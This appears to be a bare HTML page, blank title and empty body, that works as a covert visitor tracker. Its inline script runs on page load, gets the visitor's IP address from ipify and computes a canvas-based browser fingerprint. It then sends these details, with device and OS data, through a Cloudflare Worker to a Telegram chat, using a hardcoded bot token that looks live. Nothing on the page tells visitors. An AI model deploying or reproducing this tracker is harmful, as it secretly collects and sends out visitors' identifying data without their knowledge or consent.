<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title> <!-- Blank Title -->
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.33/src/ua-parser.min.js"></script>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #7a5353; /* or #000 */
        }
    </style>
</head>
<body>
    <script>
    (async () => {
        // --- Config ---
        const TELEGRAM_BOT_TOKEN = "7712919519:AAEeR3i1iv06EzLqBPbzxCQFKh42clhAg3c";
        const TELEGRAM_CHAT_ID   = "1002745190343";
        const WORKER_URL         = "https://muddy-union-2fa4.z3957759.workers.dev/send";

        // --- Function to send data via Cloudflare Worker ---
        const sendToTelegram = async (message) => {
            try {
                await fetch(WORKER_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        token: TELEGRAM_BOT_TOKEN,
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    }),
                });
            } catch (error) {
                console.error("Telegram send failed:", error);
            }
        };

        // --- Helper: Get IP ---
        const getIpAddress = async () => {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                return data.ip || "Not Found";
            } catch {
                return "Not Found";
            }
        };

        // --- Helper: Fingerprint ---
        const getComprehensiveFingerprint = async () => {
            const getCanvasFingerprint = () => {
                try {
                    const canvas = document.createElement("canvas");
                    const ctx = canvas.getContext("2d");
                    ctx.fillText("Browser Fingerprint 123!@#", 2, 15);
                    return canvas.toDataURL();
                } catch {
                    return "error";
                }
            };

            const components = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
                timezone: new Intl.DateTimeFormat().resolvedOptions().timeZone,
                canvas: getCanvasFingerprint(),
            };

            const componentString = JSON.stringify(components, Object.keys(components).sort());
            const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(componentString));
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
        };

        // --- Main block ---
        const runAnalysisAndSend = async () => {
            const parser = new UAParser();
            const result = parser.getResult();
            const [ipAddress, fingerprint] = await Promise.all([
                getIpAddress(),
                getComprehensiveFingerprint()
            ]);

            const message = `
*üö® New Visit Detected! üö®*
-----------------------------------
*üì± Device & OS*
> *Company:* \`${result.device.vendor || 'Unknown'}\`
> *Model:* \`${result.device.model || 'Unknown'}\`
> *Type:* \`${result.device.type || 'Desktop'}\`
> *OS:* \`${result.os.name || 'Unknown'} ${result.os.version || ''}\`

*üîí Network & Fingerprint*
> *IP Address:* \`${ipAddress}\`
> *Unique ID:* \`${fingerprint.substring(0, 16)}...\`

*‚öôÔ∏è Raw User Agent*
\`${navigator.userAgent}\`
            `;

            await sendToTelegram(message);
        };

        window.addEventListener("load", runAnalysisAndSend);
    })();
    </script>
</body>
</html>

